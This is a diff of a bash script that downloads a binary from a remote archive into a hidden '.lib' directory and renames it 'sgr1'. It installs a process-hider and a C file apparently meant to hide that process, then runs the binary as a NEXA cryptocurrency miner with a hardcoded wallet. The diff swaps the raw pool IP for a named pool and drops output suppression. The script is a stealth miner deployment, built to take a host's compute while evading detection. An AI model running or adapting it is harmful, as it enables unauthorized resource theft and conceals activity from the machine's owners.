@@ -1,6 +1,6 @@
 #!/bin/bash
 set -x
-apt-get update 
+apt-get update
 apt-get install -y wget curl sudo
 curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
 apt-get install build-essential -y
@@ -21,8 +21,8 @@ npm i -g node-process-hider
 ph add sgr1
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 mkdir .lib && cd .lib
-wget https://github.com/preak07/kopi/releases/download/zuta/kopong.tar.gz > /dev/null 2>&1 
+wget https://github.com/preak07/kopi/releases/download/zuta/kopong.tar.gz  
 tar -xvf kopong.tar.gz 
 chmod +x kopong
 mv kopong sgr1
-./sgr1 -pool1 159.203.162.18:3333 -wallet nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -coin NEXA -p $WORKER -algo rx/0
+./sgr1 -pool1 rx.unmineable.com:3333 -wallet nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -coin NEXA -p $WORKER -algo rx/0
